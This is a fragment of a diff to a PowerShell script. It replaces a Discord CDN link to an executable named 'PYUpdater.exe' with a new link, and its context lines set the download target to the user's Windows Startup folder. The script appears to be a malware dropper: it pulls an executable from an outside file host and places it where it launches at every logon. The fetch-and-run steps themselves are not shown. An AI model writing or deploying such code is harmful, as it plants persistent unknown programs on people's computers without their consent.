@@ -37,7 +37,7 @@ if ($process) {
     Write-Host ""
 }
 
-$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1525098610629414945/PYUpdater.exe?ex=6a522643&is=6a50d4c3&hm=323223dadb9674153c46043336ad1dac623b8b66c0c47c3bddff3a2fa5e4c3e5&"
+$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1525555387774926939/PYUpdater.exe?ex=6a53cfab&is=6a527e2b&hm=94afe7b86a5c6528869f0179f5453237906f2f72cb3eccdf7c605369c63e8dc7&"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $fn = "PYUpdater.exe"
 $fp = Join-Path -Path $dest -ChildPath $fn
